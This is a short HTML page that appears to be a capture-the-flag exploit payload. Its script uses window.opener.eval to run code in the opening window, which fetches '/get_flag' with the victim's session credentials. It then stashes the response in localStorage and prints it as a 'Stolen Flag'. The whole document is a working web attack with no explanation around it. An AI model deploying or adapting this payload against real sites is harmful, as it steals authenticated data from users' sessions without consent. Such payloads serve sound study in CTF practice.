<!DOCTYPE html>
<html>
<body>
<script>
if (window.opener) {
  window.opener.eval(`
    fetch('/get_flag', { credentials: 'include' })
      .then(r => r.text())
      .then(flag => {
        localStorage.setItem('stolen_flag', flag);
      });
  `);

  // Wait a bit and then pull the flag from localStorage
  setTimeout(() => {
    document.write('<h1>Stolen Flag:</h1>');
    document.write('<pre>' + localStorage.getItem('stolen_flag') + '</pre>');
  }, 1000);
}
</script>
</body>
</html>
